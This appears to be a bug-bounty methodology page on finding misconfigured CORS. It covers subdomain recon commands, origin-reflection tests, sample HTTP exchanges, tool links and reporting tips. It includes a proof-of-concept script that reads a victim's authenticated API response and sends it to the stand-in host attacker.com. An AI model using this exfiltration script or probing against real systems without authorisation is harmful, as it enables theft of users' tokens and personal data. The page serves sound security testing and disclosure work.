# Misconfigured CORS

Cross-Origin Resource Sharing (CORS) tells browsers which foreign origins may read responses via `Access-Control-Allow-Origin` (ACAO). When a server reflects or over-permissively accepts the `Origin` header **and** allows credentials, any attacker page can silently read a victim's authenticated responses — PII, API keys, tokens. Impact is typically information disclosure leading toward account takeover; severity scales with what the exposed endpoints return.

Origin-check bypass variants: [CORS_Bypasses.md](./CORS_Bypasses.md)

## Hunting Checklist

### Method 1 — single target (manual, Burp)

1. Capture the target and spider/crawl the whole site with Burp.
2. In Burp's search tool, look for `Access-Control` in responses.
3. Add an attacker `Origin` header to interesting requests — `Origin: https://attacker.com`, `Origin: null`, `Origin: https://attacker.target.com`, `Origin: https://target.attacker.com` (variants in [CORS_Bypasses.md](./CORS_Bypasses.md)).
4. If the response reflects the attacker origin in `Access-Control-Allow-Origin` (and ideally sends `Access-Control-Allow-Credentials: true`), the endpoint is vulnerable.
5. Confirm with a real cross-origin fetch from your evil page before reporting.

### Method 2 — multiple domains incl. subdomains

```bash
subfinder -d target.com -o domains.txt
cat domains.txt | httpx | tee -a alive.txt
cat alive.txt | parallel -j 10 curl --proxy "http://127.0.0.1:8080" -sk 2>/dev/null
```

Then repeat Method 1 against the traffic.

### Method 3 — automated

```bash
subfinder -d domain.com -o target.txt
cat target.txt | httpx | tee -a alive.txt
cat alive.txt | gau | tee -a urls.txt
# run CORScanner / Corsy / theftfuzzer / CorsMe on each URL
# manually verify every hit (false positives are common)
```

### Method 4 — meg + gf (bulk request across paths)

```bash
subfinder -d target.com | tee -a hosts1
findomain -t target.com | tee -a hosts1
assetfinder --subs-only target.com | tee -a hosts1
cat hosts1 | sort -u | tee -a hosts2
cat hosts2 | httpx | tee -a hosts
echo "/" > paths
meg -v            # run from the directory containing hosts + paths
cat meg/* | gf cors   # lists URLs whose responses carry Access-Control headers
```

## Test Cases & Examples

Vulnerable reflection (attacker origin echoed back with credentials):

```http
GET /api/v1/userdata HTTP/1.1
Host: target.com
Origin: https://attacker.com
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"email":"victim@target.com","token":"..."}
```

Proof-of-concept fetch to run from `https://attacker.com`:

```html
<script>
fetch('https://target.com/api/v1/userdata', {credentials: 'include'})
  .then(r => r.text())
  .then(t => new Image().src = 'https://attacker.com/leak?d=' + encodeURIComponent(t));
</script>
```

## Bypass Techniques

Reflection exists but your exact origin is rejected (regex/prefix allowlist)? Work through the origin-value bypass list in [CORS_Bypasses.md](./CORS_Bypasses.md) — subdomain suffix/prefix tricks, `null`, `%`, path-appended origins, and method switching.

## Tools & Resources

- [CORScanner](https://github.com/chenjj/CORScanner) · [theftfuzzer](https://github.com/lc/theftfuzzer) · [Corsy](https://github.com/s0md3v/Corsy) · [CorsMe](https://github.com/Shivangx01b/CorsMe)
- [meg](https://github.com/tomnomnom/meg) · [gf](https://github.com/tomnomnom/gf) (+ [cors pattern](https://github.com/1ndianl33t/Gf-Patterns)) · [subfinder](https://github.com/projectdiscovery/subfinder) · [assetfinder](https://github.com/tomnomnom/assetfinder) · [findomain](https://github.com/Edu4rdSHL/findomain) · [httpx](https://github.com/projectdiscovery/httpx) · gau/waybackurls
- Original author: **[@Virdoex_hunter](https://twitter.com/Virdoex_hunter)**

## Report Tips

- The finding is *cross-origin read of authenticated data* — include the endpoint, the exact reflected headers (`ACAO` + `ACAC: true`), and the PoC fetch proving data arrives at your origin.
- Quantify what's leaked (PII, CSRF tokens, session/refresh tokens, API keys); token/PII disclosure usually reads medium–high, public non-authenticated content usually informational.
- List all origins you got reflected (from the bypass page too) — a regex-allowlist bypass on one endpoint implies the same flaw across authenticated endpoints, which strengthens triage and deduplication.
